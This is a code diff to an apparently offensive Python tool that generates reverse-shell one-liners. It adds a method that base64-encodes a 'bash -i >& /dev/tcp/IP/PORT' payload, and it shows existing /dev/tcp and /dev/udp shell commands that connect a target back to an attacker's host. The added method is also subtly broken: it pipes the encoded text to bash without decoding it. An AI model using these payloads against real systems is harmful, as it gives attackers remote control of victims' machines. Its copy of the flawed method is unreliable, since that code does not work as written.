@@ -21,6 +21,12 @@ class reverseShell():
     def typeBash4(self, ip, port):
         return '0<&196;exec 196<>/dev/tcp/{0}/{1};sh <&196 >&196 2>&196'.format(ip, port)
 
+    def typeBashEchoBase64(self, ip, port):
+        shellcode = 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(
+            ip, port).encode()
+        b64shellcode = base64.b64encode(shellcode).decode()
+        return 'echo {} | bash'.format(b64shellcode)
+
     def typeBashUDP(self, ip, port):
         return 'sh -i >& /dev/udp/{0}/{1} 0>&1'.format(ip, port)
 
@@ -203,7 +209,7 @@ if __name__ == '__main__':
                         help='display with table mode.')
     tgroup.add_argument('--maxrow', default=60,
                         help='set the max length of each \'command\' table line when displaying')
-    tgroup.add_argument('--maxline', default=2,
+    tgroup.add_argument('--maxline', default=1,
                         help='set the max length of each \'command\' table line when displaying')
     args = parser.parse_args()
 
